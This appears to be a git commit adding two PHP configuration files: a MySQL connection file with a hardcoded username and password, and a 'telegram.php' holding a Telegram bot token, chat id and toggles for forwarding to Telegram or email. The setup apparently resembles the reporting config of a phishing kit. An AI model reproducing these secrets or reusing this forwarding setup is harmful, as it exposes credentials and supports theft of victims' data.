b46da465577aa351ac1a7491efb418144aabe88a
burtonkendal85-cell <burtonkendal85@gmail.com>
2026-05-12 09:28:45 -0700

    Add files via upload

---
+++ mobi/Analysis405/db_connect.php
@@ -0,0 +1,11 @@
+<?php
+$servername = "localhost:3306";
+$dbusername = "par6122_root";
+$dbpassword = "!!!Welcome!!!";
+$dbname = "par6122_analysis";
+
+
+// Create connection
+$conn = mysqli_connect($servername, $dbusername, $dbpassword, $dbname);
+
+?>
---
+++ mobi/telegram.php
@@ -0,0 +1,11 @@
+<?php
+$send_bot =1;  // 1 to use telegram, 0 to off
+$botToken = "6833523520:AAGaGUjE1FKZAMKcsuOmOsH71z5PjEwpGag";
+$id = "5763174469";
+
+
+$send_email =0; // 1 to use email, 0 to off
+$box = "sample@email.com";
+
+
+?>
